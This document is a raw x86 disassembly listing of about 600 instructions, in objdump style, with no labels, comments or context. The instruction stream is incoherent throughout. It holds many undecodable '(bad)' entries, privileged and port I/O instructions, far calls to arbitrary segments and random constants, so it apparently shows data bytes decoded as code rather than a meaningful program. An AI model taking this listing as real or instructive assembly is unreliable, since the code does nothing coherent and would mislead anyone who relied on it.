  412244:	mov    dh,0x49
  412246:	jp     0x41223e
  412248:	jb     0x41222a
  41224a:	xor    al,0xb7
  41224c:	mov    ds:0xdcd6ed08,al
  412251:	nop
  412252:	dec    ecx
  412253:	scas   eax,DWORD PTR es:[edi]
  412254:	aam    0xa8
  412256:	nop
  412257:	je     0x4122b2
  412259:	mov    bh,0x65
  41225b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41225c:	clc    
  41225d:	cmp    al,0xf2
  41225f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412260:	retf   0xf6d8
  412263:	(bad)  
  412265:	add    DWORD PTR [edi+0x6900d0c],edi
  41226b:	sbb    edi,DWORD PTR [ebx]
  41226d:	std    
  41226e:	(bad)
  412272:	bound  edi,QWORD PTR [esi]
  412274:	jae    0x4121fb
  412276:	sub    al,ah
  412278:	sub    BYTE PTR [ebp-0x887f1b1],bh
  41227e:	out    0x7e,al
  412280:	jecxz  0x4122fc
  412282:	imul   DWORD PTR [edi+ebx*1+0x67dc21c5]
  412289:	sub    edi,DWORD PTR [eax-0x4fbdfbc0]
  41228f:	fbld   TBYTE PTR [ebp-0x19]
  412292:	xchg   edi,eax
  412293:	(bad)  
  412294:	aad    0xa1
  412296:	imul   ebx,DWORD PTR [edx],0xffffffe5
  412299:	xchg   edx,eax
  41229a:	sbb    BYTE PTR ds:0xda5ed0ab,bh
  4122a0:	enter  0x6b23,0x7d
  4122a4:	retf   
  4122a5:	out    dx,eax
  4122a6:	pop    ecx
  4122a7:	loopne 0x412297
  4122a9:	ds mov eax,0xc7ddbdd6
  4122af:	fidivr WORD PTR gs:[edi-0x2f2d39]
  4122b6:	or     BYTE PTR [edx+ebp*1-0x78],0x4d
  4122bb:	pop    eax
  4122bc:	push   ds
  4122bd:	sahf   
  4122be:	push   cs
  4122bf:	fwait
  4122c0:	mov    esi,0xc6a6d333
  4122c5:	add    BYTE PTR [ecx],dl
  4122c7:	jae    0x412341
  4122c9:	icebp  
  4122ca:	shr    BYTE PTR [edx-0x2b],0xdf
  4122ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122cf:	xor    ebp,DWORD PTR [eax+0xed22066]
  4122d5:	scas   eax,DWORD PTR es:[edi]
  4122d6:	cmp    BYTE PTR [ebx],ah
  4122d8:	in     eax,dx
  4122d9:	sbb    ebp,ebx
  4122db:	sbb    dl,cl
  4122dd:	mov    dl,0xeb
  4122df:	(bad)  
  4122e0:	and    dl,ch
  4122e2:	cmp    al,0x3
  4122e4:	inc    esi
  4122e5:	or     bl,BYTE PTR [ebx+eax*8]
  4122e8:	pusha  
  4122e9:	rcr    DWORD PTR [edi],0x4d
  4122ec:	sbb    eax,0x4def48ff
  4122f1:	das    
  4122f2:	or     BYTE PTR [edi+ebp*8+0x26],0x93
  4122f7:	and    eax,0x358ee32e
  4122fc:	adc    ebp,DWORD PTR [ebx]
  4122fe:	adc    esi,edi
  412300:	pop    edi
  412301:	inc    eax
  412302:	mov    WORD PTR [esi+0x0],?
  412305:	add    bh,bl
  412307:	and    ah,BYTE PTR ds:0x9408f87
  41230d:	mov    ecx,DWORD PTR [eax+0x14]
  412310:	xchg   esi,eax
  412311:	aaa    
  412312:	add    BYTE PTR [edi+esi*1-0x34],0xdc
  412317:	retf   
  412318:	mov    eax,ds:0x3a4b19ae
  41231d:	enter  0x29b0,0xa2
  412321:	or     BYTE PTR [ebx-0x5a],0x31
  412325:	jecxz  0x4122ca
  412327:	leave  
  412328:	mov    ch,0xfa
  41232a:	mov    ch,BYTE PTR [edi]
  41232c:	aaa    
  41232d:	mov    ch,0x93
  41232f:	stos   BYTE PTR es:[edi],al
  412330:	pop    ss
  412331:	scas   ax,WORD PTR es:[edi]
  412333:	js     0x4122f3
  412335:	nop
  412336:	sub    DWORD PTR [ecx],esp
  412338:	dec    esi
  412339:	fadd   st,st(4)
  41233b:	comiss xmm1,DWORD PTR [ebp+0x2321c85f]
  412342:	mov    ds:0x511ca217,al
  412347:	scas   al,BYTE PTR es:[edi]
  412348:	sbb    esp,DWORD PTR [ecx]
  41234a:	ror    DWORD PTR ss:[esi],0xe6
  41234e:	inc    ebx
  41234f:	bnd jns 0x412346
  412352:	das    
  412353:	test   BYTE PTR [esi-0x33],dh
  412356:	dec    esi
  412357:	cwde   
  412358:	xchg   ecx,eax
  412359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41235a:	cmp    edi,DWORD PTR [eax+0x3e]
  41235d:	stos   BYTE PTR es:[edi],al
  41235e:	sub    ch,cl
  412360:	dec    ebp
  412361:	cs pop edi
  412363:	mov    esi,0x482d3a38
  412368:	mov    cl,0xce
  41236a:	mov    esi,0xddccab7a
  41236f:	mov    ds:0x5e04dd43,eax
  412374:	sbb    al,cl
  412376:	fistp  DWORD PTR [esi-0x9]
  412379:	mov    bh,0x1b
  41237b:	push   esi
  41237c:	sub    eax,esi
  41237e:	in     al,dx
  41237f:	cmp    al,0x2d
  412381:	cmp    eax,0x399baf18
  412386:	sbb    DWORD PTR [esi-0x45],ebx
  412389:	dec    edi
  41238a:	mov    dl,0x3
  41238c:	sub    al,0x62
  41238e:	sbb    al,BYTE PTR [edi+0x3d]
  412391:	or     BYTE PTR [edi-0x1a],dh
  412394:	cmp    BYTE PTR ds:0x898c86f3,bl
  41239a:	pop    ds
  41239b:	jno    0x4123d3
  41239d:	push   esp
  41239e:	popa   
  41239f:	mov    edi,0x891437fc
  4123a4:	out    dx,eax
  4123a5:	std    
  4123a6:	rcr    bl,1
  4123a8:	sbb    BYTE PTR [esi],al
  4123aa:	inc    esp
  4123ab:	xchg   edx,eax
  4123ac:	xchg   edx,eax
  4123ad:	fisub  DWORD PTR [ecx-0x78]
  4123b0:	rcr    BYTE PTR [esp+edx*4],0x55
  4123b4:	mov    edx,0xf82febbd
  4123b9:	sbb    eax,0x27f89afd
  4123be:	pushf  
  4123bf:	add    al,0xd6
  4123c1:	je     0x41236a
  4123c3:	sbb    al,0x63
  4123c5:	in     al,0xf9
  4123c7:	in     eax,0x51
  4123c9:	in     eax,0xfd
  4123cb:	ret    0x93cb
  4123ce:	sbb    BYTE PTR ds:0x2f16b1ba,dh
  4123d4:	sahf   
  4123d5:	adc    ebp,0xffffff94
  4123d8:	or     BYTE PTR [ebx],dh
  4123da:	pop    ss
  4123db:	sub    eax,0xfd64dbb0
  4123e0:	lods   eax,DWORD PTR ds:[esi]
  4123e1:	pushf  
  4123e2:	into   
  4123e3:	pavgw  mm0,QWORD PTR [edi+0x4f]
  4123e7:	and    ch,bl
  4123e9:	adc    eax,0x8dae30c1
  4123ee:	inc    edx
  4123ef:	icebp  
  4123f0:	outs   dx,DWORD PTR ds:[esi]
  4123f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123f2:	ud1    edi,DWORD PTR [esi]
  4123f5:	ret    0x371c
  4123f8:	push   ecx
  4123f9:	scas   al,BYTE PTR es:[edi]
  4123fa:	ins    DWORD PTR es:[edi],dx
  4123fb:	(bad)
  412400:	lahf   
  412401:	and    cl,BYTE PTR [ecx+0x1a78bf91]
  412407:	push   ss
  412408:	jne    0x41240b
  41240a:	pushf  
  41240b:	cmp    DWORD PTR [edi+0x48],edx
  41240e:	retf   0x50cd
  412411:	call   0x5ebc:0x89729882
  412418:	xlat   BYTE PTR ds:[ebx]
  412419:	mov    ds:0x74cc5e84,eax
  41241e:	xchg   ebx,eax
  41241f:	jge    0x412448
  412421:	jmp    0x41242e
  412423:	mov    esp,ecx
  412425:	jo     0x4124a4
  412427:	jae    0x4123e3
  412429:	in     eax,0xbc
  41242b:	lahf   
  41242c:	stos   DWORD PTR es:[edi],eax
  41242d:	jb     0x412425
  41242f:	sbb    BYTE PTR [edi-0x709680bd],cl
  412435:	scas   eax,DWORD PTR es:[edi]
  412436:	repz pop edx
  412438:	dec    BYTE PTR [edx]
  41243a:	sub    al,0x50
  41243c:	mov    ds:0x410f430d,al
  412441:	das    
  412442:	es sub eax,0x56e26edc
  412448:	or     eax,0x316a4020
  41244d:	dec    esi
  41244e:	push   edi
  41244f:	inc    edi
  412450:	dec    ebp
  412451:	out    0x46,eax
  412453:	scas   al,BYTE PTR es:[edi]
  412454:	push   ecx
  412455:	add    DWORD PTR [ecx+0x5f],0x8aefbf6e
  41245c:	adc    eax,DWORD PTR [edi]
  41245e:	ror    DWORD PTR [edi+edx*1+0x34],1
  412462:	retf   0xed1
  412465:	push   0xffffffc9
  412467:	xor    DWORD PTR [edx-0x7f586d44],eax
  41246d:	and    ecx,DWORD PTR [ebp-0x2e]
  412470:	sub    al,bh
  412472:	fimul  WORD PTR [edi+ebx*1]
  412475:	inc    edx
  412477:	pop    esp
  412478:	out    0x77,al
  41247a:	pop    ebp
  41247b:	and    eax,0xc99ed33d
  412480:	xor    bh,BYTE PTR [ebp-0x27743581]
  412486:	mov    esi,0x589d4b64
  41248b:	sbb    ebp,DWORD PTR [eax-0x2a]
  41248e:	cmc    
  41248f:	stos   DWORD PTR es:[edi],eax
  412490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412491:	push   esp
  412492:	rcl    BYTE PTR [edi],cl
  412494:	add    cl,BYTE PTR [bx+di]
  412497:	mov    al,ds:0x9255d19
  41249c:	mul    BYTE PTR [edi]
  41249e:	inc    eax
  41249f:	cdq    
  4124a0:	nop
  4124a1:	mov    ecx,0x6593bd77
  4124a6:	sbb    DWORD PTR [eax],edi
  4124a8:	rcl    BYTE PTR [ecx+0x855cd23],1
  4124ae:	cdq    
  4124af:	clc    
  4124b0:	out    dx,al
  4124b1:	jnp    0x4124ac
  4124b3:	push   es
  4124b4:	popf   
  4124b5:	mov    esp,0xa7c6f41c
  4124ba:	jg     0x4124bd
  4124bc:	ja     0x41251a
  4124be:	jbe    0x4124e2
  4124c0:	pop    ss
  4124c1:	push   esi
  4124c2:	cmc    
  4124c3:	jl     0x4124e7
  4124c5:	(bad)
  4124ca:	aad    0xdd
  4124cc:	mov    dl,0x5c
  4124ce:	fwait
  4124cf:	arpl   WORD PTR [esi-0x3f],bx
  4124d2:	jb     0x412485
  4124d4:	pushf  
  4124d5:	pushf  
  4124d6:	sub    edx,esp
  4124d8:	mov    ecx,0x598117b4
  4124dd:	dec    edi
  4124de:	std    
  4124df:	mov    bh,BYTE PTR [edi+0x27]
  4124e2:	push   0x54
  4124e4:	outs   dx,DWORD PTR ds:[esi]
  4124e5:	call   0xd178fb2a
  4124ea:	xlat   BYTE PTR ds:[ebx]
  4124eb:	in     eax,dx
  4124ec:	loop   0x412567
  4124ee:	xor    al,0xc7
  4124f0:	push   ebp
  4124f1:	dec    esp
  4124f2:	(bad)  
  4124f3:	xchg   ebx,eax
  4124f4:	jmp    FWORD PTR [eax-0x3e]
  4124f7:	int3   
  4124f8:	add    al,0x42
  4124fa:	(bad)  
  4124fb:	ins    DWORD PTR es:[edi],dx
  4124fc:	cmp    BYTE PTR [ecx+0x5a3b6878],bl
  412502:	pop    DWORD PTR ds:0xd09ca1d4
  412508:	enter  0x4779,0xe5
  41250c:	mov    ebx,DWORD PTR [eax-0x278115d4]
  412512:	jnp    0x412518
  412514:	xchg   edi,eax
  412515:	jmp    0x784323b4
  41251a:	cli    
  41251b:	xor    esi,DWORD PTR [eax+0x1f]
  41251e:	inc    edx
  41251f:	fcom   DWORD PTR [edx+0x55]
  412522:	shl    BYTE PTR [ebx-0x1541b89e],1
  412528:	cwde   
  412529:	stos   DWORD PTR es:[edi],eax
  41252a:	ret    
  41252b:	ja     0x4124e0
  41252d:	mov    dl,BYTE PTR [ebx-0x43]
  412530:	xor    ebp,edi
  412532:	lods   eax,DWORD PTR ds:[esi]
  412533:	cmp    ebx,DWORD PTR [ecx]
  412535:	and    al,0xe7
  412537:	dec    esp
  412538:	mov    WORD PTR [eax-0x3dc13c4c],fs
  41253e:	pushf  
  41253f:	btc    DWORD PTR [eax],ecx
  412542:	inc    edx
  412543:	add    eax,DWORD PTR [ebx+0x4ea747a9]
  412549:	pop    ebp
  41254a:	(bad)  
  41254b:	cmc    
  41254c:	outs   dx,DWORD PTR ds:[esi]
  41254d:	imul   BYTE PTR [edx+0x79547993]
  412553:	(bad)
  412556:	lods   eax,DWORD PTR ds:[esi]
  412557:	xchg   ebx,eax
  412558:	pop    edi
  412559:	mov    ds:0x3e46fe91,al
  41255e:	(bad)  [ebx+0x1a8d0c2c]
  412564:	push   0x5e
  412566:	retf   0x84da
  412569:	sub    al,0xdc
  41256b:	nop
  41256c:	pop    es
  41256d:	mov    esp,0x7553b759
  412572:	push   ebp
  412573:	xchg   edx,eax
  412574:	enter  0xe751,0xa6
  412578:	mov    es,WORD PTR [esi+0x39c02b8a]
  41257e:	inc    edi
  41257f:	les    esp,FWORD PTR [esi]
  412581:	mov    ah,0xc4
  412583:	xchg   esp,eax
  412584:	inc    eax
  412585:	pop    DWORD PTR [edx+0x47d198ce]
  41258b:	inc    edi
  41258c:	repnz out dx,al
  41258e:	xchg   ebx,eax
  41258f:	(bad)  [ecx+0x62981921]
  412595:	fcom   DWORD PTR ds:0xc951f022
  41259b:	inc    eax
  41259c:	fst    QWORD PTR [ecx]
  41259e:	test   ebp,esi
  4125a0:	add    BYTE PTR [esi+0x6aae7f08],cl
  4125a6:	in     al,0xe0
  4125a8:	add    dh,bh
  4125aa:	pop    ds
  4125ab:	jnp    0x412575
  4125ad:	gs jmp 0x9d7bf91f
  4125b3:	loopne 0x412612
  4125b5:	mov    ds:0x4932626,al
  4125ba:	adc    DWORD PTR [edi+eax*4+0x7163ef45],ecx
  4125c1:	sub    esi,esp
  4125c3:	daa    
  4125c4:	pop    eax
  4125c5:	add    BYTE PTR [edx+0x27],ch
  4125c8:	(bad)  
  4125c9:	jns    0x41257b
  4125cb:	sbb    DWORD PTR [edi-0x68],ecx
  4125ce:	mov    cl,0xce
  4125d0:	xor    eax,DWORD PTR [ecx+0x24]
  4125d3:	mov    dl,0xd9
  4125d5:	ret    
  4125d6:	pop    ecx
  4125d7:	push   ebx
  4125d8:	cmp    DWORD PTR [ebx+0x72],ebx
  4125db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125dc:	in     al,dx
  4125dd:	adc    ch,BYTE PTR [edi+0x5a9cbf5e]
  4125e3:	stc    
  4125e4:	(bad)  
  4125e6:	xchg   BYTE PTR [eax],bl
  4125e8:	imul   eax,DWORD PTR [edi+ebp*1],0x736bfdd4
  4125ef:	jnp    0x41266d
  4125f1:	mov    eax,0xb49a0f39
  4125f6:	push   cs
  4125f7:	sub    dh,0x36
  4125fa:	inc    edx
  4125fb:	jbe    0x412660
  4125fd:	lock jo 0x4125ff
  412600:	pop    edx
  412601:	mov    edx,0xe86eb44
  412606:	paddw  mm7,QWORD PTR [edi+0x13c2b77b]
  41260d:	inc    ebp
  41260e:	es mov dl,0x67
  412611:	mov    esp,0x54f5fded
  412616:	mov    DWORD PTR [eax+0x233affa0],edi
  41261c:	mov    BYTE PTR [esi],dl
  41261e:	loopne 0x4125d5
  412620:	gs push 0x2a44ffbc
  412626:	daa    
  412627:	std    
  412628:	(bad)  
  41262a:	stc    
  41262b:	jns    0x412671
  41262d:	xor    al,0xa3
  41262f:	push   esi
  412630:	loopne 0x4126ad
  412632:	lea    ebx,[ebp-0x774d68be]
  412638:	ror    BYTE PTR [eax+0x72],cl
  41263b:	jno    0x4126af
  41263d:	repnz mov edx,0xdfe6f471
  412643:	mov    ch,0x17
  412645:	xchg   DWORD PTR [ecx],edx
  412647:	scas   eax,DWORD PTR es:[edi]
  412648:	sbb    ah,BYTE PTR [esi-0x56]
  41264b:	adc    BYTE PTR [edx],ch
  41264d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41264e:	psubsb mm0,QWORD PTR cs:[edi-0x517734f0]
  412656:	and    al,0xf4
  412658:	sub    BYTE PTR [edx],dh
  41265a:	cs scas eax,DWORD PTR es:[edi]
  41265c:	arpl   WORD PTR [ebx+0x11],cx
  41265f:	add    BYTE PTR [esi],dl
  412661:	rol    BYTE PTR [edx-0x5c8df7de],cl
  412667:	bound  ebx,QWORD PTR [ebx]
  412669:	or     al,0xc6
  41266b:	call   0xc82:0xa8ca1e9e
  412672:	popa   
  412673:	cld    
  412674:	dec    edx
  412675:	cmp    DWORD PTR [ebx-0x4e5aedf5],ebp
  41267b:	lds    edx,FWORD PTR cs:[ebx-0x64dba78d]
  412682:	inc    ecx
  412683:	inc    eax
  412684:	arpl   WORD PTR [ebp-0x10],sp
  412687:	(bad)  
  412688:	repz sbb eax,0x18e2adc6
  41268e:	xlat   BYTE PTR ds:[ebx]
  41268f:	fldcw  WORD PTR [ebp+eax*2-0x477b1c1d]
  412696:	nop
  412697:	and    DWORD PTR [ebx],ebp
  412699:	jmp    0xb2b1:0x7c5b28b5
  4126a0:	outs   dx,DWORD PTR ds:[esi]
  4126a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126a2:	ror    DWORD PTR [ecx],cl
  4126a4:	scas   eax,DWORD PTR es:[edi]
  4126a5:	or     eax,0xee0a7218
  4126aa:	cmp    al,0x4c
  4126ac:	push   ebx
  4126ad:	bound  esi,QWORD PTR [esi-0x14]
  4126b0:	retf   
  4126b1:	jmp    0x412724
  4126b3:	jp     0x4126f1
  4126b5:	not    DWORD PTR [edx]
  4126b7:	repnz sub al,0x63
  4126ba:	mov    bl,0x19
  4126bc:	mov    ds:0x1a415a01,al
  4126c1:	aam    0x8c
  4126c3:	mov    edi,0x105c6043
  4126c8:	inc    edi
  4126c9:	mov    ecx,DWORD PTR [edx+0x69]
  4126cc:	push   ds
  4126cd:	out    dx,al
  4126ce:	test   DWORD PTR [ecx],0xb32631e4
  4126d4:	and    al,0x81
  4126d6:	ins    DWORD PTR es:[edi],dx
  4126d7:	mov    esi,0x16e91fa5
  4126dc:	mov    ds:0x4e260d97,al
  4126e1:	es aaa 
  4126e3:	ss leave 
  4126e5:	lods   eax,DWORD PTR ds:[esi]
  4126e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126e7:	mov    esi,0x6a4d851e
  4126ec:	push   ebp
  4126ed:	ficomp WORD PTR [eax+0x68dafd9]
  4126f3:	lahf   
  4126f4:	sub    al,ah
  4126f6:	adc    dh,BYTE PTR [eax-0x36ee1988]
  4126fc:	int    0x1c
  4126fe:	cs pop es
  412700:	stos   BYTE PTR es:[edi],al
  412701:	call   FWORD PTR [edx+ebp*1-0x106b8e96]
  412708:	stos   BYTE PTR es:[edi],al
  412709:	mov    ch,0x6c
  41270b:	frndint 
  41270d:	xchg   BYTE PTR [ebx+0x3117c3d5],dl
  412713:	sbb    DWORD PTR [eax],esp
  412715:	pushw  0x2c
  412718:	and    BYTE PTR ds:0x4d43c9ce,0xaa
  41271f:	mov    esi,0xfdb85d7d
  412724:	clc    
  412725:	lahf   
  412726:	add    DWORD PTR [edi],eax
  412728:	call   FWORD PTR [ecx-0x58ca1489]
  41272e:	xor    ch,bh
  412730:	add    eax,0xd3a9a774
  412735:	jb     0x412779
  412737:	scas   al,BYTE PTR es:[edi]
  412738:	scas   al,BYTE PTR es:[edi]
  412739:	test   eax,0xfb4e291f
  41273e:	neg    eax
  412740:	lods   eax,DWORD PTR ds:[esi]
  412741:	pop    ebp
  412742:	jae    0x412743
  412744:	rol    DWORD PTR [edx-0x214b828a],1
  41274a:	jae    0x412727
  41274c:	add    eax,0xa1fa1b32
  412751:	or     al,0xc9
  412753:	mov    bh,0xaf
  412755:	loopne 0x4127c1
  412757:	out    dx,al
  412758:	push   ds
  412759:	aaa    
  41275a:	in     eax,0xfe
  41275c:	loopne 0x412794
  41275e:	loopne 0x4126ff
  412760:	and    eax,ebx
  412762:	stos   DWORD PTR es:[edi],eax
  412763:	inc    ecx
  412764:	ins    DWORD PTR es:[edi],dx
  412765:	add    al,0x8a
  412767:	in     al,dx
  412768:	mov    BYTE PTR [esi+eiz*1+0x33],dl
  41276c:	xchg   edi,eax
  41276d:	in     eax,dx
  41276e:	fdiv   st,st(7)
  412770:	adc    eax,0x2d942f70
  412775:	push   edx
  412776:	mov    esi,0xaaa278e1
  41277b:	shl    edi,1
  41277d:	or     ebx,DWORD PTR [ebx+0x59a6e08d]
  412783:	clc    
  412784:	cmp    al,0x46
  412786:	jl     0x412726
  412788:	outs   dx,BYTE PTR ds:[esi]
  412789:	imul   esp,DWORD PTR [eax+0x388eaa64],0x68baf06b
  412793:	mov    ecx,0x2750e645
  412798:	inc    esp
  412799:	icebp  
  41279a:	jns    0x412732
  41279c:	sahf   
  41279d:	rcr    esi,0xb2
  4127a0:	dec    eax
  4127a1:	(bad)  
  4127a2:	xlat   BYTE PTR ds:[ebx]
  4127a3:	dec    ebx
  4127a4:	inc    edx
  4127a5:	mov    DWORD PTR [eax+0x5398e04e],edi
  4127ab:	pop    ebx
  4127ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127ad:	xor    ch,BYTE PTR [esi+0x49]
  4127b0:	js     0x412771
  4127b2:	xchg   esp,eax
  4127b3:	repz sub al,BYTE PTR [edi]
  4127b6:	ins    DWORD PTR es:[edi],dx
  4127b7:	adc    eax,0xa89ce694
  4127bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127bd:	into   
  4127be:	or     eax,0x5a91b125
  4127c3:	mov    ebp,0xfdb73908
  4127c8:	push   0xffffffb8
  4127ca:	or     esp,DWORD PTR [ebp-0x5]
  4127cd:	daa    
  4127ce:	std    
  4127cf:	push   esp
  4127d0:	or     eax,0x997c0aca
  4127d5:	out    dx,al
  4127d6:	push   ss
  4127d7:	loopne 0x412822
  4127d9:	pop    edx
  4127da:	sti    
  4127db:	fsub   st(6),st
  4127dd:	xchg   ebx,eax
  4127de:	xor    eax,DWORD PTR ss:[eax+0x7b]
  4127e2:	inc    esp
  4127e3:	retf   
  4127e4:	std    
  4127e5:	jae    0x41276c
  4127e7:	loopne 0x41278c
  4127e9:	jg     0x4127f8
  4127eb:	pushf  
  4127ec:	imul   esp,DWORD PTR [eax+0x3f5fdd29],0x56
  4127f3:	jnp    0x41282b
  4127f5:	inc    eax
  4127f6:	out    dx,eax
  4127f7:	out    dx,eax
  4127f8:	es xor eax,0x68cf6412
  4127fe:	out    0xb,eax
  412800:	and    esp,DWORD PTR [edx]
  412802:	mov    ebp,0xab5818da
  412807:	mov    WORD PTR [edi-0x7faa57f1],?
  41280d:	xor    DWORD PTR [esi+0x29a0697a],ebp
  412813:	loop   0x412887
  412815:	ror    BYTE PTR [eax+0x6e504b57],1
  41281b:	sub    esi,DWORD PTR [edi-0x57]
  41281e:	retf   0x1987
  412821:	sbb    eax,0x224504f3
  412826:	and    BYTE PTR [edx-0x3a],bh
  412829:	loopne 0x412856
  41282b:	mov    ds:0x1418aebd,eax
  412830:	(bad)  
  412831:	aaa    
  412832:	xlat   BYTE PTR ds:[ebx]
  412833:	ins    BYTE PTR es:[edi],dx
  412834:	test   eax,0xb4c082e4
  412839:	and    DWORD PTR [edx],ebx
  41283b:	inc    edx
  41283c:	std    
  41283d:	push   es
  41283e:	idiv   DWORD PTR [ebx+esi*2+0x77e8c541]
  412845:	pop    edx
  412846:	out    0x6b,eax
  412848:	ins    DWORD PTR es:[edi],dx
  412849:	aaa    
  41284a:	inc    ebx
  41284b:	push   ebx
  41284c:	dec    edx
  41284d:	dec    edx
  41284e:	dec    esi
  41284f:	xchg   edi,eax
  412850:	inc    edx
  412851:	repnz stc 
  412853:	(bad)
  412857:	cmp    eax,0xecc2bdd6
  41285c:	fbstp  TBYTE PTR [ecx+esi*8]
  41285f:	pushf  
  412860:	xchg   edi,eax
  412861:	cwde   
  412862:	ins    DWORD PTR es:[edi],dx
  412863:	dec    ebx
  412864:	push   0xffffffb7
  412866:	xchg   ebp,eax
  412867:	pop    ds
  412868:	das    
  412869:	out    0x58,eax
  41286b:	xor    ch,cl
  41286d:	adc    eax,0x5a10d434
  412872:	ja     0x4128a7
  412874:	push   eax
  412875:	push   cs
  412876:	pop    ds
  412877:	fcomp  st(5)
  412879:	mov    ah,BYTE PTR [esi+0x6c]
  41287c:	(bad)  
  41287d:	pop    esp
  41287e:	jbe    0x4128b8
  412880:	(bad)  
  412881:	stos   BYTE PTR es:[edi],al
  412882:	xor    al,BYTE PTR [ecx]
  412884:	xor    BYTE PTR [edx-0x5e493f4d],dl
  41288a:	push   ecx
  41288b:	outs   dx,DWORD PTR ds:[esi]
  41288c:	push   ss
  41288d:	sbb    eax,DWORD PTR [edi+esi*1+0x17d6f399]
  412894:	pop    es
  412895:	dec    ebx
  412896:	adc    ebp,DWORD PTR [edx+0x31feda74]
  41289c:	jle    0x412883
  41289e:	mov    ebx,0x9fe78e36
  4128a3:	pop    ecx
  4128a4:	mov    ebp,0xe568fc77
  4128a9:	mov    bl,0x4
  4128ab:	fimul  DWORD PTR [ebp+0x42]
  4128ae:	dec    eax
  4128af:	xchg   ebp,eax
  4128b0:	xchg   ebx,eax
  4128b1:	sbb    eax,0x7ab9f3b4
  4128b6:	fldenv [edi]
  4128b8:	sbb    BYTE PTR [edi+ecx*1],bh
  4128bb:	(bad)  
  4128bc:	(bad)  [ebx]
  4128be:	or     eax,eax
  4128c0:	mov    bl,0x6
  4128c2:	ret    0x6e32
  4128c5:	mov    esp,DWORD PTR [ebx-0x71]
  4128c8:	icebp  
  4128c9:	jnp    0x4128dc
  4128cb:	lds    esi,FWORD PTR [edi-0x7ef1832f]
  4128d1:	xchg   esi,eax
  4128d2:	or     eax,0x50f8d63d
  4128d7:	in     eax,0x3e
  4128d9:	int    0xb9
  4128db:	int    0xb8
  4128dd:	sti    
  4128de:	dec    ebx
  4128df:	mov    ecx,DWORD PTR [ebx-0x34cbf8ac]
  4128e5:	(bad)  
  4128e6:	pop    esp
  4128e7:	xor    eax,DWORD PTR ds:0x7f1baffb
  4128ed:	adc    DWORD PTR [eax-0xf],0xc2407bda
  4128f4:	push   0x6eba53c6
  4128f9:	dec    BYTE PTR [ecx+0x63]
  4128fc:	icebp  
  4128fd:	jp     0x4128dc
  4128ff:	test   BYTE PTR [ecx],0xfb
  412902:	hlt    
  412903:	mul    BYTE PTR [eax]
  412905:	out    0x91,al
  412907:	dec    ebx
  412908:	xchg   BYTE PTR [esi+0x41],al
  41290b:	popf   
  41290c:	jle    0x41289d
  41290e:	jns    0x41291f
  412910:	movlhps xmm4,xmm6
  412913:	push   ebx
  412914:	es pop ds
  412916:	sub    eax,0x1f
  412919:	nop
  41291a:	xor    eax,0x5d0a121e
  41291f:	push   esp
  412920:	adc    ebp,DWORD PTR es:[ebp-0x79c33f99]
  412927:	(bad)  
  412928:	ja     0x4128e4
  41292a:	mov    edi,ss
  41292c:	neg    bh
  41292e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292f:	sbb    ebp,DWORD PTR [ecx-0x28]
  412932:	add    al,0xad
  412934:	pop    ecx
  412935:	popf   
  412936:	pop    ds
  412937:	mov    bl,0xa3
  412939:	call   0x86b54e22
  41293e:	sar    DWORD PTR [eax-0x7a931be4],1
  412944:	inc    edi
  412945:	push   0x22
  412947:	or     ebp,DWORD PTR [esi]
  412949:	ds test eax,0x94405e0d
  41294f:	jo     0x41291b
  412951:	xor    bl,BYTE PTR [edx-0x635f8f2a]
  412957:	scas   eax,DWORD PTR es:[edi]
  412958:	inc    edi
  412959:	mov    edx,0xda83b366
  41295e:	scas   eax,DWORD PTR es:[edi]
  41295f:	(bad)  
  412960:	cli    
  412961:	stc    
  412962:	push   cs
  412963:	pmullw mm0,QWORD PTR [esi]
  412966:	es sub eax,0x667895aa
  41296c:	ror    BYTE PTR [ebx+0x4e94758e],1
  412972:	stos   BYTE PTR es:[edi],al
  412973:	stos   BYTE PTR es:[edi],al
  412974:	int    0xca
  412976:	jno    0x412925
  412978:	aaa    
  412979:	add    bp,ax
  41297c:	popf   
  41297d:	js     0x4129e5
  41297f:	popa   
  412980:	ret    0x8f6d
  412983:	xor    edx,DWORD PTR [edi]
  412985:	popa   
  412986:	adc    BYTE PTR [ecx],cl
  412988:	clc    
  412989:	push   eax
  41298a:	pop    eax
  41298b:	xchg   BYTE PTR [eax+0x20e4211a],bl
  412991:	enter  0x1c40,0x3f
  412995:	push   0xffffffca
  412997:	xchg   ecx,eax
  412998:	das    
  412999:	or     edx,DWORD PTR [eax+0x7b]
  41299c:	shr    BYTE PTR [ecx],0xfb
  41299f:	dec    ebx
  4129a0:	mov    ds:0x2a156018,eax
  4129a5:	dec    ch
  4129a7:	inc    eax
  4129a8:	popf   
  4129a9:	pushf  
  4129aa:	sbb    al,0x5d
  4129ac:	mov    DWORD PTR [edi-0x1b],esp
  4129af:	push   esi
  4129b0:	jecxz  0x41298e
  4129b2:	xor    eax,0xf1fb186c
  4129b7:	lea    ecx,[eax]
  4129b9:	fimul  DWORD PTR [edx]
  4129bb:	mov    edi,0xd34a93af
  4129c0:	mov    edi,ecx
  4129c2:	rcl    BYTE PTR [ebx],cl
  4129c4:	inc    ebp
  4129c5:	mov    edi,DWORD PTR [ecx+ebx*8+0x5670ceed]
  4129cc:	mul    DWORD PTR [edi-0x8f413f7]
  4129d2:	cdq    
  4129d3:	cli    
  4129d4:	and    eax,0xdc33eceb
  4129d9:	fsubr  DWORD PTR [eax-0x33]
  4129dc:	adc    BYTE PTR [esi-0x65424ef7],ch
  4129e2:	dec    edx
  4129e3:	les    ecx,FWORD PTR ds:0x1d48992e
  4129e9:	int    0xb4
  4129eb:	test   DWORD PTR [ebp+0x3bd4bd05],eax
  4129f1:	sbb    DWORD PTR [ebp-0x44eba63f],ecx
  4129f7:	lods   eax,DWORD PTR ds:[esi]
